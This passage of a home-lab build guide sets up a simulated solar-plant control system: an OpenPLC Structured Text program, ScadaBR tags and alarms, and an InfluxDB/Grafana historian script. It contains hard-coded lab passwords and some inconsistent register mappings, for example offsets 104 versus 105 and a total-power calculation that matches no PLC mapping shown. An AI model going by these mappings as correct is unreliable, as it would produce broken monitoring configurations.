    Also verify the service is bound to 0.0.0.0 (not just 127.0.0.1):
    ss -tlnp | grep 8080

Problem: OpenPLC status shows "failed" immediately after starting
Fix: sudo journalctl -u openplc -n 50
    Common cause: Previous crash left a lock file.
    Fix: sudo rm -f /tmp/openplc.lock (or similar in OpenPLC directory)
    sudo systemctl restart openplc
```

---

## STEP 13: Write the PLC Control Program

### 🔵 What the PLC Program Does

The PLC program runs inside OpenPLC on the Raspberry Pi. It:
1. Reads data from 4 inverters (Modbus master → Field-Simulator VM)
2. Calculates total plant power output
3. Monitors for fault conditions and triggers alarms
4. Makes data available for SCADA to read (Modbus slave)
5. Allows SCADA to send power curtailment commands to inverters

This is written in **Structured Text (ST)** — the most commonly used IEC 61131-3 language. ST looks like Pascal/Ada and is used in real Siemens TIA Portal programs.

### 🟢 Action: Install OpenPLC Editor on WS-A (Windows)

```
Step 13.1: Download OpenPLC Editor on WS-A:
           URL: https://www.openplcproject.com/plcopen-editor/
           Download: Windows version
           Install normally (no admin required, installs to user directory)
           
           WHY Editor on Windows: You write and compile the PLC program on
           Windows in the Editor, then upload the compiled file to the Pi.
           The Pi itself only needs the Runtime (which is already installed).

Step 13.2: Open OpenPLC Editor
           File → New Project
           Project name: SolarPlantController
           Location: C:\solar_guard\plc_programs\
           Select PLC: Raspberry Pi (or Generic Linux)
           → OK

Step 13.3: In the project tree (left panel):
           Right-click "Programs" → Add Program
           Name: MAIN
           Language: ST (Structured Text)
           → OK
```

### 🟢 Action: Write the PLC Program in Structured Text

```
Step 13.4: In the MAIN program editor, replace all content with:
```

```pascal
(* ================================================================
   Solar Plant Controller - OpenPLC Structured Text Program
   IEC 61131-3 Structured Text Language
   Controls: 4 × 250 kW Inverters, reads Weather Station
   Written for OpenPLC Runtime v3 on Raspberry Pi 4
   ================================================================ *)

(* ────────── VARIABLE DECLARATIONS ────────── *)
PROGRAM MAIN

VAR
    (* Inverter 1 Input Variables — mapped to Modbus slave 1 registers *)
    inv1_dc_voltage     : INT;   (* Reg 0: DC Voltage × 10 *)
    inv1_dc_current     : INT;   (* Reg 1: DC Current × 10 *)
    inv1_ac_power_hi    : INT;   (* Reg 4: AC Power high word *)
    inv1_ac_power_lo    : INT;   (* Reg 5: AC Power low word *)
    inv1_panel_temp     : INT;   (* Reg 7: Panel temp × 10 *)
    inv1_status         : INT;   (* Reg 8: 0=Off,1=Run,2=Fault,3=Throttled *)
    inv1_fault_code     : INT;   (* Reg 11: Fault code *)
    inv1_power_limit    : INT;   (* Reg 20: Power limit % — WRITE to inverter *)
    
    (* Inverter 2 Input Variables *)
    inv2_ac_power_hi    : INT;
    inv2_ac_power_lo    : INT;
    inv2_panel_temp     : INT;
    inv2_status         : INT;
    inv2_fault_code     : INT;
    inv2_power_limit    : INT;
    
    (* Inverter 3 Input Variables *)
    inv3_ac_power_hi    : INT;
    inv3_ac_power_lo    : INT;
    inv3_panel_temp     : INT;
    inv3_status         : INT;
    inv3_fault_code     : INT;
    inv3_power_limit    : INT;
    
    (* Inverter 4 Input Variables *)
    inv4_ac_power_hi    : INT;
    inv4_ac_power_lo    : INT;
    inv4_panel_temp     : INT;
    inv4_status         : INT;
    inv4_fault_code     : INT;
    inv4_power_limit    : INT;
    
    (* Weather Station Inputs *)
    ws_irradiance       : INT;   (* W/m² *)
    ws_ambient_temp     : INT;   (* Temp × 10 *)
    ws_wind_speed       : INT;   (* Wind × 10 m/s *)
    
    (* Calculated Plant Totals — SCADA reads these from PLC *)
    plant_total_power_kw : INT;  (* Sum of all inverter AC power, in kW *)
    plant_running_count  : INT;  (* Number of inverters currently running *)
    plant_fault_count    : INT;  (* Number of inverters in fault state *)
    
    (* Alarm Flags — written to Coil outputs, read by SCADA *)
    alarm_high_temp     : BOOL;  (* Any inverter > 75°C *)
    alarm_any_fault     : BOOL;  (* Any inverter in fault state *)
    alarm_low_generation : BOOL; (* Plant below expected output for irradiance *)
    
    (* Internal calculation variables *)
    inv1_ac_power_w     : DINT;
    inv2_ac_power_w     : DINT;
    inv3_ac_power_w     : DINT;
    inv4_ac_power_w     : DINT;
    total_power_w       : DINT;
    expected_kw         : INT;
    
END_VAR

(* ────────── PROGRAM LOGIC ────────── *)

(* STEP 1: Reconstruct 32-bit AC power values from two 16-bit registers *)
(* Modbus sends 32-bit integers as two 16-bit words: (high << 16) | low *)
inv1_ac_power_w := SHL(DINT#inv1_ac_power_hi, 16) OR DINT#inv1_ac_power_lo;
inv2_ac_power_w := SHL(DINT#inv2_ac_power_hi, 16) OR DINT#inv2_ac_power_lo;
inv3_ac_power_w := SHL(DINT#inv3_ac_power_hi, 16) OR DINT#inv3_ac_power_lo;
inv4_ac_power_w := SHL(DINT#inv4_ac_power_hi, 16) OR DINT#inv4_ac_power_lo;

(* STEP 2: Calculate plant-wide totals *)
total_power_w := inv1_ac_power_w + inv2_ac_power_w + inv3_ac_power_w + inv4_ac_power_w;
plant_total_power_kw := INT#(total_power_w / 1000);

(* STEP 3: Count running vs fault inverters *)
plant_running_count := 0;
plant_fault_count   := 0;

IF inv1_status = 1 THEN plant_running_count := plant_running_count + 1; END_IF;
IF inv2_status = 1 THEN plant_running_count := plant_running_count + 1; END_IF;
IF inv3_status = 1 THEN plant_running_count := plant_running_count + 1; END_IF;
IF inv4_status = 1 THEN plant_running_count := plant_running_count + 1; END_IF;

IF inv1_status = 2 THEN plant_fault_count := plant_fault_count + 1; END_IF;
IF inv2_status = 2 THEN plant_fault_count := plant_fault_count + 1; END_IF;
IF inv3_status = 2 THEN plant_fault_count := plant_fault_count + 1; END_IF;
IF inv4_status = 2 THEN plant_fault_count := plant_fault_count + 1; END_IF;

(* STEP 4: High temperature alarm — any inverter panel > 75°C *)
alarm_high_temp := FALSE;
IF inv1_panel_temp > 750 THEN alarm_high_temp := TRUE; END_IF;   (* 750 = 75.0°C *)
IF inv2_panel_temp > 750 THEN alarm_high_temp := TRUE; END_IF;
IF inv3_panel_temp > 750 THEN alarm_high_temp := TRUE; END_IF;
IF inv4_panel_temp > 750 THEN alarm_high_temp := TRUE; END_IF;

(* STEP 5: Any fault alarm *)
alarm_any_fault := (plant_fault_count > 0);

(* STEP 6: Low generation alarm
   Expected output = irradiance × 4 panels × 250 kW × efficiency
   If actual < 60% of expected → alarm *)
expected_kw := INT#(ws_irradiance) * 4 * 250 / 1000;   (* Expected kW at this irradiance *)
IF ws_irradiance > 200 AND plant_total_power_kw < (expected_kw * 6 / 10) THEN
    alarm_low_generation := TRUE;
ELSE
    alarm_low_generation := FALSE;
END_IF;

(* STEP 7: Power limit pass-through
   SCADA can write inv1_power_limit (and inv2-4).
   PLC writes this value to the inverter's Reg 20.
   This is the curtailment chain: SCADA → PLC memory → Modbus write → Inverter *)
(* Power limits are handled by the Modbus slave configuration — 
   inv1_power_limit variable IS the register 20 value that gets written *)

END_PROGRAM
```

```
Step 13.5: Configure Modbus Slave connections in OpenPLC Editor:
           (This defines which Modbus devices the PLC reads FROM)
           
           In OpenPLC Editor: Project → Settings → Modbus/TCP Slave Devices
           
           Add Device 1 — Inverter-1:
           IP Address: 10.10.10.10     (Field-Simulator VM)
           Port: 5501
           Slave ID: 1
           Polling Rate: 100ms
           
           Map registers to PLC variables:
           Holding Registers (FC=3):
           Reg 0  → %IW100  (inv1_dc_voltage)
           Reg 1  → %IW101  (inv1_dc_current)
           Reg 4  → %IW104  (inv1_ac_power_hi)
           Reg 5  → %IW105  (inv1_ac_power_lo)
           Reg 7  → %IW107  (inv1_panel_temp)
           Reg 8  → %IW108  (inv1_status)
           Reg 11 → %IW111  (inv1_fault_code)
           Reg 20 → %QW100  (inv1_power_limit — Output/Write)
           
           Repeat for Inverters 2-4 (ports 5502-5504)
           and WeatherStation (port 5510, registers 0-4)

Step 13.6: Configure SCADA-readable outputs:
           The PLC also acts as a Modbus SLAVE for SCADA to poll.
           OpenPLC automatically makes PLC variables accessible via
           its built-in Modbus slave (running on port 502 of the Pi).
           
           SCADA will poll: 10.10.10.1:502
           This gives SCADA access to all %IW and %QW variables.

Step 13.7: Build and upload:
           Build → Compile Project
           Wait for: "Compilation successful"
           
           If compilation errors: Check that all variable names match exactly.
           ST is case-sensitive.
           
           Upload → Connect to Runtime:
           Address: 10.10.10.1
           Port: 43628 (OpenPLC default upload port)
           
           Upload → OK
           
           The PLC program is now running on the Raspberry Pi!
```

---

## STEP 14-16: Validate Level 1 (PLC)

```
Step 14.1: In OpenPLC web UI (http://10.10.10.1:8080):
           Navigate to "Monitoring" tab
           
           You should see live values updating every second:
           %IW104 (inv1_ac_power_hi): Should be non-zero during daytime
           %IW108 (inv1_status): Should be 1 (Running)
           %IW100 (ws_irradiance): Should show irradiance in W/m²
           
           If all values show 0:
           → Check Field-Simulator VM is running
           → Check network: On Pi, can you reach 10.10.10.10?
             On Pi terminal: curl http://10.10.10.10 (will fail but proves routing)
             ping test won't work (ICMP may be blocked) — use modbus test instead

Step 14.2: Test SCADA-readable data (PLC as Modbus slave):
           From the Field-Simulator VM (same subnet):
           source ~/solar_plant/.venv/bin/activate
           python3 -c "
           from pymodbus.client import ModbusTcpClient
           c = ModbusTcpClient('10.10.10.1', port=502, timeout=5)
           c.connect()
           r = c.read_holding_registers(100, 10, slave=1)
           print('PLC registers 100-109:', r.registers)
           c.close()
           "
           
           Expected: A list of non-zero integers representing inverter data
           If ModbusException: OpenPLC Modbus slave may need to be enabled
           → Web UI → Slave Devices → Enable external Modbus slave

Step 14.3: Force-write test (curtailment simulation):
           In OpenPLC Monitoring → Find %QW100 (inv1_power_limit)
           Click → Force Value → Enter 50 → OK
           
           Watch Field-Simulator log:
           tail -f ~/solar_plant/logs/field_sim.log
           
           Inverter-1 power should drop to ~50% within 2 seconds.
           Restore: Force %QW100 back to 100
```

### 🟡 Verify: Level 1 Checkpoint

```
[ ] OpenPLC service active (sudo systemctl status openplc)
[ ] Web UI accessible at http://10.10.10.1:8080
[ ] Monitoring page shows non-zero inverter values
[ ] PLC status: "Running" (green indicator)
[ ] Modbus slave test: PLC registers readable from another VM
[ ] Force-write test: Inverter power responds to curtailment command

🔴 DO NOT BUILD SCADA until all items are checked.
```

---

# ═══════════════════════════════════════════════════
# PHASE 3 — LEVEL 2: SCADA & HMI
# ═══════════════════════════════════════════════════

## STEP 17: Create SCADA-Server VM on WS-A

### 🔵 Why SCADA Uses Ubuntu Desktop (not Server)

SCADA (Supervisory Control and Data Acquisition) is where operators watch the plant. The ScadaBR interface is browser-based but requires a display to use effectively. Ubuntu Desktop provides:
- Firefox browser to view ScadaBR's HMI screens
- Ability to open multiple windows (SCADA + terminal + documentation)
- VNC access so you can see the SCADA screen remotely from WS-A's Windows

### 🟢 Action: Create SCADA-Server VM in VMware (WS-A)

```
Step 17.1: VMware → File → New Virtual Machine
           Setup: Typical → Next
           
           Select: "I will install the operating system later" → Next
           Guest OS: Linux → Ubuntu 64-bit → Next

Step 17.2: VM Name: SCADA-Server
           Location: D:\VMs\SCADA-Server\
           → Next

Step 17.3: Disk: 40 GB, single file → Next

Step 17.4: Customize Hardware:
           Memory: 4096 MB  (Desktop + Java + Firefox = 3+ GB needed)
           Processors: 2 cores
           
           CD/DVD: Use ISO file → browse to ubuntu-24.04.4-desktop-amd64.iso
           ✅ Connect at power on
           
           Network Adapter 1: Custom → VMnet3 (OT-LEVEL2-NET, 10.10.20.0/24)
           WHY VMnet3: SCADA is at Level 2, above the PLCs. Its own subnet.
           
           ⚠️ ADD SECOND ADAPTER for internet during setup:
           Click "Add..." → Network Adapter → Finish
           New adapter: VMnet8 (NAT)
           WHY: Ubuntu Desktop installer needs internet for updates.
           Also needed for apt install of Java, openssh-server, and ScadaBR deps.
           
           Display: ✅ Accelerate 3D graphics (Desktop VM requires this)
           
           → Close → Finish → Power On

Step 17.5: Ubuntu 24.04.4 Desktop installer (GUI — different from Server):

           Welcome screen → "Install Ubuntu" button

           Language: English → Next

           Accessibility: Next (no changes needed)

           Keyboard layout: English (US) → Next

           Connect to the internet:
           ✅ "Connect to a Wi-Fi or wired network" will auto-detect the
           VMnet8 NAT adapter and show it as connected.
           If it shows connected → Next (keep it)
           If it shows no network → it will still install; add packages later.

           What to install:
           "Ubuntu Desktop (default)" → Next
           ☐ Install recommended proprietary software → leave unchecked

           Installation type:
           "Erase disk and install Ubuntu" → Install Now → Continue

           Timezone: Asia/Kolkata → Next

           Account setup:
           Name: Solar Admin
           Computer name: scada-server
           Username: solaradmin
           Password: SolarLab2024!
           ☐ Log in automatically (leave unchecked — require password)
           → Next

           Installation: 15-25 minutes
           Restart Now → Enter when prompted to remove media

Step 17.6: After reboot — log in as solaradmin / SolarLab2024!

           Install VMware Tools for better display and clipboard:
           VM menu → Install VMware Tools
           In Ubuntu terminal (Ctrl+Alt+T):
           sudo apt install -y open-vm-tools open-vm-tools-desktop
           
           Reboot: sudo reboot

Step 17.7: Configure static IP on the OT adapter (Ubuntu Desktop uses NetworkManager):

           Open Terminal (Ctrl+Alt+T)
           
           First — find the correct NetworkManager connection names:
           nmcli connection show
           
           You will see TWO connections:
           "Wired connection 1"  → one of the adapters
           "Wired connection 2"  → the other adapter
           (Names may also appear as the interface name like "ens33")
           
           Identify which connection is which adapter:
           nmcli -f NAME,DEVICE,GENERAL.STATE connection show --active
           
           The connection with a 192.168.216.x IP = VMnet8 (NAT — temporary)
           The connection with NO IP or APIPA (169.x) = VMnet3 (OT — configure this)
           
           To check IPs: ip addr show
           
           Configure static IP on the VMnet3 (OT) connection:
           Replace "Wired connection 2" with whichever connection is your VMnet3:
           
           sudo nmcli connection modify "Wired connection 2" \
             ipv4.addresses "10.10.20.10/24" \
             ipv4.gateway "10.10.20.254" \
             ipv4.dns "8.8.8.8" \
             ipv4.method manual
           
           sudo nmcli connection up "Wired connection 2"
           
           Verify OT IP is applied: ip addr show  → should show 10.10.20.10/24
           Verify internet still works: ping -c 3 8.8.8.8

Step 17.8: Install packages NOW while internet (NAT) is available:
           sudo apt update
           sudo apt install -y openssh-server openjdk-11-jdk wget curl \
             unzip nano net-tools
           sudo systemctl enable --now ssh
           
           After all packages and ScadaBR are fully installed and working,
           remove the NAT adapter (same process as Step 10.7 for Field-Simulator):
           Power off → VMware Settings → Remove Network Adapter 2 (VMnet8) → OK
           Power on → verify only 10.10.20.10 remains.
```

---

## STEP 18: Install Java 11 and ScadaBR

### 🔵 Why Java 11 Specifically?

ScadaBR is built on Apache Tomcat and Java. It was developed for Java 8 and later certified for Java 11. **Java 17 and Java 21 break ScadaBR** — newer Java versions removed APIs that ScadaBR uses internally. Always install the application-required version.

### 🟢 Action: Install Java 11 and ScadaBR

```
Step 18.1: On SCADA-Server VM terminal:
           sudo apt update && sudo apt upgrade -y
           
           Install Java 11:
           sudo apt install -y openjdk-11-jdk wget curl unzip
           
           Verify: java -version
           Expected: openjdk version "11.0.XX"
           
           Set Java 11 as default (Ubuntu 24 may have Java 17 from other packages):
           sudo update-alternatives --config java
           Select the number corresponding to Java 11 (/usr/lib/jvm/java-11-...)
           
Step 18.2: Download ScadaBR:
           cd ~
           
           Method 1 (SourceForge):
           wget "https://sourceforge.net/projects/scadabr/files/latest/download" \
               -O scadabr_latest.zip --content-disposition
           
           Method 2 (if Method 1 fails — GitHub):
           wget https://github.com/ScadaBR/ScadaBR/releases/latest
           (Find the latest .zip asset link and wget it)
           
           unzip scadabr_latest.zip
           ls   → You'll see a folder like "ScadaBR_1.1.0_Community" or similar
           cd ScadaBR_1.1.0_Community   (replace with actual folder name)

Step 18.3: Configure ScadaBR before first start:
           ls   → You should see: start-scadabr.sh, ScadaBR/, conf/, etc.
           
           Edit the startup script to set JAVA_HOME:
           nano start-scadabr.sh
           
           Find the JAVA_HOME line (or add near top):
           export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
           
           Save and exit.
           
           Make executable:
           chmod +x *.sh

Step 18.4: Start ScadaBR:
           ./start-scadabr.sh
           
           Watch for Tomcat startup messages.
           Wait for: "INFO: Server startup in XXXX ms"  (30-90 seconds)
           
           Open Firefox on SCADA-Server desktop:
           URL: http://localhost:8080/ScadaBR
           
           Login: admin / admin
           
           ⚠️ FIRST ACTION: Change admin password immediately
           Users icon (top right) → Edit profile → Change password → SolarSCADA2024!

Step 18.5: Create systemd service for ScadaBR:
           sudo nano /etc/systemd/system/scadabr.service
```

```ini
[Unit]
Description=ScadaBR SCADA Platform
After=network.target

[Service]
Type=forking
User=solaradmin
Environment="JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64"
WorkingDirectory=/home/solaradmin/ScadaBR_1.1.0_Community
ExecStart=/home/solaradmin/ScadaBR_1.1.0_Community/start-scadabr.sh
ExecStop=/home/solaradmin/ScadaBR_1.1.0_Community/stop-scadabr.sh
Restart=on-failure
RestartSec=30

[Install]
WantedBy=multi-user.target
```

```
           sudo systemctl daemon-reload
           sudo systemctl enable scadabr
           sudo systemctl start scadabr
```

---

## STEP 19: Configure ScadaBR Data Sources and Tags

### 🔵 What a Data Source and Tag Are

In SCADA terminology:
- **Data Source** = a connection to a data provider (our Modbus TCP PLC)
- **Tag (Data Point)** = one specific measurement value (e.g., "Inverter-1 AC Power")

We're creating ONE data source (the Raspberry Pi Modbus slave) and 20+ tags (every measurement we want to display and log).

### 🟢 Action: Configure Data Sources

```
Step 19.1: In ScadaBR web UI:
           Left menu → Data Sources → + (Add)
           
           Data Source Type: Modbus TCP
           Name: RaspberryPi-PLC
           Transport: TCP
           Host: 10.10.10.1    (Raspberry Pi IP)
           Port: 502           (OpenPLC Modbus slave port)
           Slave ID: 1
           Timeout: 5000ms
           Update period: 1000ms  (poll every 1 second)
           → Save

Step 19.2: Add Data Points (Tags) to this data source:
           Click on "RaspberryPi-PLC" → + Add Data Point

           For each tag below, select:
           Function Code: Read Holding Registers (FC=3)
           
           TAG 1: Inverter-1 AC Power
           Name: inv1_ac_power_kw
           Offset: 104    (register %IW104 in PLC = register 104)
           Data Type: 2-byte Integer (signed)
           Multiplier: 0.001  (convert W to kW... approximately)
           NOTE: For full 32-bit power, configure two registers and combine.
           Engineering unit: kW
           
           [Repeat for all inverters and weather station — see table below]

Complete Tag Table:
┌──────────────────────────┬────────┬─────────────┬──────────┐
│ Tag Name                 │ Reg    │ Scale       │ Units    │
├──────────────────────────┼────────┼─────────────┼──────────┤
│ inv1_ac_power_kw         │ 105    │ /1000       │ kW       │
│ inv1_panel_temp_c        │ 107    │ /10         │ °C       │
│ inv1_status              │ 108    │ 1           │ code     │
│ inv2_ac_power_kw         │ 115    │ /1000       │ kW       │
│ inv2_panel_temp_c        │ 117    │ /10         │ °C       │
│ inv2_status              │ 118    │ 1           │ code     │
│ inv3_ac_power_kw         │ 125    │ /1000       │ kW       │
│ inv3_panel_temp_c        │ 127    │ /10         │ °C       │
│ inv3_status              │ 128    │ 1           │ code     │
│ inv4_ac_power_kw         │ 135    │ /1000       │ kW       │
│ inv4_panel_temp_c        │ 137    │ /10         │ °C       │
│ inv4_status              │ 138    │ 1           │ code     │
│ plant_total_power_kw     │ 200    │ 1           │ kW       │
│ plant_running_inverters  │ 201    │ 1           │ count    │
│ ws_irradiance            │ 210    │ 1           │ W/m²     │
│ ws_ambient_temp_c        │ 211    │ /10         │ °C       │
└──────────────────────────┴────────┴─────────────┴──────────┘
```

---

## STEP 20: Build HMI Mimic Diagram

```
Step 20.1: In ScadaBR:
           Left menu → Graphical Views → + New View
           Name: Solar Plant Overview
           
Step 20.2: Add background:
           Set background color to dark grey (#1e1e1e) — simulates 
           industrial HMI dark theme standard.

Step 20.3: Add text elements:
           Add label: "SOLAR GUARD — 1 MW PLANT"
           Add labels for each inverter location in a row

Step 20.4: Add data point displays:
           For each inverter, add:
           - Dynamic text showing ac_power_kw value
           - Color indicator: Green = running, Red = fault, Grey = off
           
Step 20.5: Add a total plant power display (large, top center)
           Link to: plant_total_power_kw tag
           Format: "Plant Output: XXX kW"

Step 20.6: Add weather box:
           Link irradiance and temperature tags
           This gives operators context for why power may be low

Step 20.7: Save the view → it's now your HMI screen
```

---

## STEP 21: Configure Alarms

```
Step 21.1: ScadaBR → Alarms → + Add Alarm

           Alarm 1: High Temperature
           Name: INVERTER_OVERTEMP
           Data Point: Any inv*_panel_temp_c tag
           Condition: Greater than 75°C
           Severity: CRITICAL
           Message: "Inverter {name} panel temperature critical: {value}°C"

           Alarm 2: Inverter Fault
           Name: INVERTER_FAULT
           Data Point: Any inv*_status tag
           Condition: Equal to 2
           Severity: HIGH
           Message: "Inverter {name} in FAULT state"

           Alarm 3: Low Generation
           Name: LOW_GENERATION
           Data Point: plant_total_power_kw
           Condition: Less than 200 kW (when irradiance > 600 W/m²)
           Severity: MEDIUM
           Message: "Plant output below expected for current irradiance"
```

### 🟡 Verify: Level 2 Checkpoint

```
[ ] ScadaBR web UI accessible at http://10.10.20.10:8080/ScadaBR
[ ] Data source "RaspberryPi-PLC" status: Connected
[ ] All tags showing live values (not "No data")
[ ] HMI graphical view showing all 4 inverters
[ ] Alarm list functional
[ ] Write test: Power limit change from SCADA propagates to inverter

🔴 DO NOT BUILD HISTORIAN until all items are checked.
```

---

# ═══════════════════════════════════════════════════
# PHASE 4 — LEVEL 3: HISTORIAN & VISUALIZATION
# ═══════════════════════════════════════════════════

## STEP 23-29: Historian VM (Ubuntu 24.04 Server) + InfluxDB + Grafana

### 🟢 Action: Create Historian VM on WS-A

```
VMware → New VM:
Name: Historian
ISO: ubuntu-24.04.4-live-server-amd64.iso
RAM: 4096 MB  (InfluxDB is memory-intensive)
CPU: 2 cores
Disk: 80 GB   (InfluxDB data grows — 80 GB for a year of plant data)

Customize Hardware:
Network Adapter 1: VMnet4 (OT-LEVEL3-NET, 10.10.30.0/24)  ← permanent
Network Adapter 2: VMnet8 (NAT)                             ← temporary internet

Hostname: historian
Username: solaradmin / SolarLab2024!
Install OpenSSH: YES (Screen 10 — check the box)

Follow the same Ubuntu 24.04.4 installer screens as Step 8.6.
Server name at profile screen: historian

After install and first login:
  Verify internet: ping -c 3 8.8.8.8   (must work before continuing)
  sudo apt update && sudo apt full-upgrade -y

Configure static IP on the OT adapter (identify OT adapter = the one with NO IP):
  ip addr show   ← find which interface has no IP (VMnet4 adapter)

Create netplan config (check /etc/netplan/ first — may be empty):
  ls /etc/netplan/   ← if empty, skip rename. If file exists, rename it first.
  sudo nano /etc/netplan/10-solar-network.yaml
```

```yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    ens34:                     # ← your VMnet4 OT adapter name
      dhcp4: false
      dhcp6: false
      addresses:
        - 10.10.30.10/24
      routes:
        - to: default
          via: 10.10.30.254
      nameservers:
        addresses:
          - 8.8.8.8
    ens33:                     # ← your VMnet8 NAT adapter name
      dhcp4: true
```

```
sudo chmod 600 /etc/netplan/10-solar-network.yaml
sudo netplan try   → confirm when asked

Verify: ip addr show   → ens34: 10.10.30.10/24   ens33: 192.168.216.x

Install all packages NOW while NAT internet is available:
sudo apt install -y python3-venv python3-pip curl wget git nano \
  apt-transport-https software-properties-common gnupg
```

### 🟢 Action: Install InfluxDB 2.x

```
Step 24.1: On Historian VM:
           # Add InfluxDB repository
           wget -q https://repos.influxdata.com/influxdata-archive_compat.key
           echo '393e8779c89ac8d958f81f942f9ad7fb82a25e133faddaf92e15b16e6ac9ce4c \
           influxdata-archive_compat.key' | sha256sum -c && \
           cat influxdata-archive_compat.key | gpg --dearmor | \
           sudo tee /etc/apt/trusted.gpg.d/influxdata-archive_compat.gpg > /dev/null
           
           echo 'deb [signed-by=/etc/apt/trusted.gpg.d/influxdata-archive_compat.gpg] \
           https://repos.influxdata.com/debian stable main' | \
           sudo tee /etc/apt/sources.list.d/influxdata.list
           
           sudo apt update
           sudo apt install -y influxdb2 influxdb2-cli

Step 24.2: Start and enable InfluxDB:
           sudo systemctl enable --now influxdb
           
           Verify: sudo systemctl status influxdb → active (running)

Step 24.3: Initialize InfluxDB (first-time setup):
           influx setup \
             --username admin \
             --password SolarInflux2024! \
             --org solar-plant \
             --bucket solar_data \
             --retention 8760h \
             --force
           
           WHY 8760h retention: 8760 hours = 1 year. Data older than 1 year
           is automatically deleted, preventing unlimited disk growth.

Step 24.4: Get the API token (SAVE THIS — you'll need it for Grafana and the historian script):
           influx auth list
           
           Copy the token value — it's a long alphanumeric string.
           Save it: echo "INFLUX_TOKEN=<your token here>" >> ~/.bashrc
```

### 🟢 Action: Install Grafana

```
Step 25.1: Install Grafana:
           sudo apt install -y apt-transport-https software-properties-common wget
           
           wget -q -O - https://apt.grafana.com/gpg.key | gpg --dearmor | \
           sudo tee /etc/apt/keyrings/grafana.gpg > /dev/null
           
           echo "deb [signed-by=/etc/apt/keyrings/grafana.gpg] \
           https://apt.grafana.com stable main" | \
           sudo tee /etc/apt/sources.list.d/grafana.list
           
           sudo apt update
           sudo apt install -y grafana

Step 25.2: Start Grafana:
           sudo systemctl enable --now grafana-server
           
           Grafana runs on port 3000.
           Access via SSH tunnel from WS-A:
           ssh -L 3000:localhost:3000 solaradmin@10.10.30.10
           
           Browser: http://localhost:3000
           Login: admin / admin → Change to: SolarGrafana2024!

Step 26.1: Connect Grafana to InfluxDB:
           Grafana → Administration → Data Sources → Add data source
           → InfluxDB
           
           Query Language: Flux   (InfluxDB 2.x uses Flux, not InfluxQL)
           URL: http://localhost:8086
           
           WHY port 8086: InfluxDB 2.x listens on port 8086 by default.
           Verify your installation: sudo ss -tlnp | grep influx
           It should show port 8086. Use whatever port is shown if different.
           
           Organization: solar-plant
           Token: <paste your token from Step 24.4>
           Default Bucket: solar_data
           
           → Save & Test → "datasource is working" = success
```

### 🟢 Action: Deploy Historian Collection Script

```
Step 27.1: Create Python venv on Historian VM:
           sudo apt install -y python3-venv python3-pip
           python3 -m venv ~/historian_venv
           source ~/historian_venv/bin/activate
           pip install pymodbus==3.6.9 influxdb-client

Step 27.2: Create historian script:
           nano ~/solar_historian.py
```

```python
#!/usr/bin/env python3
"""
Solar Plant Historian
Collects Modbus data from Raspberry Pi PLC and writes to InfluxDB
"""
import time
import logging
from datetime import datetime, timezone
from pymodbus.client import ModbusTcpClient
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
logger = logging.getLogger(__name__)

# Configuration
PLC_HOST = "10.10.10.1"
PLC_PORT = 502
INFLUX_URL = "http://localhost:8086"
INFLUX_TOKEN = "YOUR_TOKEN_HERE"  # Replace with actual token
INFLUX_ORG = "solar-plant"
INFLUX_BUCKET = "solar_data"
POLL_INTERVAL = 10  # seconds between reads

def read_plc_data():
    """Read all relevant registers from the Pi PLC."""
    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT, timeout=5)
    if not client.connect():
        logger.warning("Cannot connect to PLC — skipping this poll")
        return None
    
    try:
        # Read 50 registers starting at 100 (covers all inverter data)
        result = client.read_holding_registers(100, 50, slave=1)
        if result.isError():
            logger.error(f"Modbus read error: {result}")
            return None
        
        r = result.registers
        
        # Reconstruct 32-bit power values from pairs of 16-bit registers
        def combine_words(high, low):
            return (high << 16) | low
        
        data = {
            "inv1_ac_power_w": combine_words(r[4], r[5]),
            "inv1_panel_temp_c": r[7] / 10.0,
            "inv1_status": r[8],
            "inv2_ac_power_w": combine_words(r[14], r[15]),
            "inv2_panel_temp_c": r[17] / 10.0,
            "inv2_status": r[18],
            "inv3_ac_power_w": combine_words(r[24], r[25]),
            "inv3_panel_temp_c": r[27] / 10.0,
            "inv3_status": r[28],
            "inv4_ac_power_w": combine_words(r[34], r[35]),
            "inv4_panel_temp_c": r[37] / 10.0,
            "inv4_status": r[38],
            "plant_total_power_kw": r[40] + r[41],
        }
        return data
    finally:
        client.close()

def write_to_influx(write_api, data):
    """Write collected data as InfluxDB points."""
    timestamp = datetime.now(timezone.utc)
    points = []
    
    # Plant-wide total
    points.append(
        Point("plant_output")
        .field("total_power_kw", data["plant_total_power_kw"])
        .time(timestamp)
    )
    
    # Per-inverter data
    for i in range(1, 5):
        points.append(
            Point("inverter")
            .tag("inverter_id", str(i))
            .field("ac_power_w", data[f"inv{i}_ac_power_w"])
            .field("panel_temp_c", data[f"inv{i}_panel_temp_c"])
            .field("status", data[f"inv{i}_status"])
            .time(timestamp)
        )
    
    write_api.write(bucket=INFLUX_BUCKET, org=INFLUX_ORG, record=points)
    logger.info(f"Wrote {len(points)} points — Plant: {data['plant_total_power_kw']} kW")

def main():
    influx_client = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
    write_api = influx_client.write_api(write_options=SYNCHRONOUS)
    
    logger.info("Historian started — polling PLC every %d seconds", POLL_INTERVAL)
    
    while True:
        try:
            data = read_plc_data()
            if data:
                write_to_influx(write_api, data)
        except Exception as e:
            logger.error(f"Historian error: {e}")
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
```

```
Step 27.3: Replace YOUR_TOKEN_HERE with the actual InfluxDB token.

Step 27.4: Create systemd service:
           sudo nano /etc/systemd/system/solar-historian.service
```

```ini
[Unit]
Description=Solar Plant Historian Data Collector
After=network-online.target influxdb.service

[Service]
Type=simple
User=solaradmin
ExecStart=/home/solaradmin/historian_venv/bin/python3 /home/solaradmin/solar_historian.py
Restart=on-failure
RestartSec=30

[Install]
WantedBy=multi-user.target
```

```
           sudo systemctl daemon-reload
           sudo systemctl enable --now solar-historian
```

---

# ═══════════════════════════════════════════════════
# PHASE 5 — SECURITY INFRASTRUCTURE (WS-B)
# ═══════════════════════════════════════════════════

## TWO-WORKSTATION COORDINATION

### 🔵 Cross-Workstation VM Communication — Corrected Architecture

VMs on WS-A (OT layer + pfSense-Internal) route internally through pfSense on WS-A.
VMs on WS-B (Wazuh, Kali, AD, ERP) use Bridged networking to appear on the home LAN
